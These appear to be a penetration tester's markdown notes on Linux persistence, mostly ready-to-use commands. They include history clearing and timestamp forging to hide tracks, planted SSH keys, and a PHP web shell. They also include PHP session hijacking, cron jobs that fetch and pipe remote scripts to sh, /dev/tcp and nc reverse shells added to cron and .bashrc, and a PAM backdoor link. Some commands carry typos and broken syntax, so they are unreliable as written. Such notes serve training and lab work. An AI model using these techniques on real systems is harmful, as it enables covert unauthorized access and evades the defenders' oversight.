# Linux Persistence

For general overview of persistance that OS neutral: [[Persistence]].

## Stealth 
```bash
unset HISTFILE         # disable writing to history file
```

#### Ippsec Timestamp checking

Find all timestamps as [[Linux-Blueteam]], with touch cp the persistence mechanicism with `touch`
```bash
ls -lt --time-style=full-iso# Displys all timestamps
find / -type f -printf "%T+ %p\n" | grep -v 00000000
touch original_lib_file -r persistence_file
```


## Backdoors required?
Reference:[airman604](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)

## ssh keys
It's not very hidden, easy to remove or detect. - https://attack.mitre.org/techniques/T1098/
```bash
# Generate on host; provide some fields
ssh-keygen  
# target machine:
# cat public key on host and echo it into .ssh/authorized_keys
mkdir .ssh
echo "ssh-rsa $base64fromkey" > .ssh/authorized_keys
```
# 
chmod 600 id_rsa
```

## php
web root /var/www/html
`touch shell.php` and add the below:
Or add within a file of this directory
Change the 'cmd' paramtre to something that LESS like to be called 
```php
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

## stealing php session
```bash
/var/lib/php/sessions # defauilt locations
sess_<SESSION_ID> # set your PHPSESSID cookie to hijack
```
Session files and cookie name are configurable in php.ini:
```php
session.save_path
session.name
```

## cronjob
```bash
CT=$(crontab -l)
CT=$CT$'\n* *     * * *   root    curl http://<ip>:<port>/run | sh'
printtf "$CT | cronbtab -
```
Serve shell script, for example:
file
```bash
#!/bin/bash
bash -i >& /dev/tcp/ip/port 0>&1
```
.bashrc
```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```
OR pam_unix.so [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

```bash
# Variable just for easy reading.
REVSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 >/tmp/f"
(crontab -l ; echo "@reboot sleep 200 && $REVSHELL")|crontab 2> /dev/null
```


## References

[Ippsec Rocks, youtube video](https://www.youtube.com//watch?v=yaV09XCDDqI&t=390s)
[9-ways-to-backdoor-a-linux-box](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) -  Backdoors
[creating-backdoor-in-pam](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html) - pam unix backdoors
[linuxbackdoors](https://tryhackme.com/room/linuxbackdoors) - Backdoors
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Persistence.md)
[Mitre Persistence](https://attack.mitre.org/techniques/T1098)